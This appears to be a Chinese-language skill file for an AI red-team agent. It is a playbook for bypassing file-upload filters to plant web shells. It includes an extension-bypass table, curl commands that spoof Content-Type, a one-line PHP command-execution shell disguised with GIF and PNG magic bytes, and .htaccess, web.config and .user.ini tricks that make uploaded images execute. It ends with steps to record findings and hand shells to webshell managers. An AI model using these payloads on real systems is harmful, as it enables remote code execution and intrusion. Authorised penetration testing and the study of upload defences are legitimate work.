---
name: file-upload
description: 文件上传绕过与解析链：扩展名/Content-Type/魔术字节/路径穿越/解析配置/图片马，含判据与落点
whenToUse: 有上传点（头像、附件、导入、编辑器、模板），或发现可写目录
role: exploit
enabled: true
---

# 文件上传

## 三步走

~~~
1. 先传无害文件（txt/png）确认能落地、能访问
2. 再试探解析：改扩展名 / 改 Content-Type / 加魔术字节
3. 最后才上传可执行内容，落点必须能访问
~~~

## 扩展名矩阵（按服务端栈挑）

| 栈 | 可执行后缀 |
|---|---|
| PHP | .php .php3 .php4 .php5 .phtml .pht .phar |
| Java | .jsp .jspx .jspf .jsw .jsv |
| ASP/ASPX | .asp .aspx .ashx .asmx .ascx |
| 大小写 | .PhP .JsP（Windows 不区分大小写） |
| 双写 | .pphphp（服务端剥一次 php） |
| 尾点/空格 | shell.php. / shell.php%20（Windows 会去掉） |
| 分号 | shell.php;.jpg（IIS 6 经典） |
| 路径穿越 | ../../shell.jsp、..%2f..%2fshell.jsp |

## Content-Type 与魔术字节

~~~bash
curl -F 'file=@shell.php;type=image/png' http://TARGET/upload
printf 'GIF89a<?php system($_GET[1]);?>' > shell.php.gif
(printf '\x89PNG\r\n\x1a\n'; cat shell.php) > shell.png
~~~

## 解析链与配置

~~~
.htaccess（Apache）：AddType application/x-httpd-php .jpg
web.config（IIS）：<handlers> 映射 .jpg -> asp
.user.ini（PHP-FPM）：auto_prepend_file=shell.jpg
Tomcat：上传到 webapps/ROOT/ 直接可执行
~~~

## 落地位置

~~~
用户目录：/uploads/2026/11/xxx   -> 需要可访问路径（响应里通常回 url）
临时目录：/tmp -> 配合 LFI 或日志包含
Web 根：传 jsp/php 到可执行目录
~~~

## 判据

- **上传成功 ≠ 可执行**：必须请求落地 URL 看到自己写入的内容（system('id') 回显，或访问静态文件确认）
- 只回 "上传成功" 但访问 404/403 = 未打通，记 suspected
- 落库：redteam_vuln_add category=file-upload，evidence 贴上传请求 + 访问 URL 的回显
- 拿到 shell 立刻走 shell-handler（冰蝎/哥斯拉/suo5），并 redteam_webshell_add 记录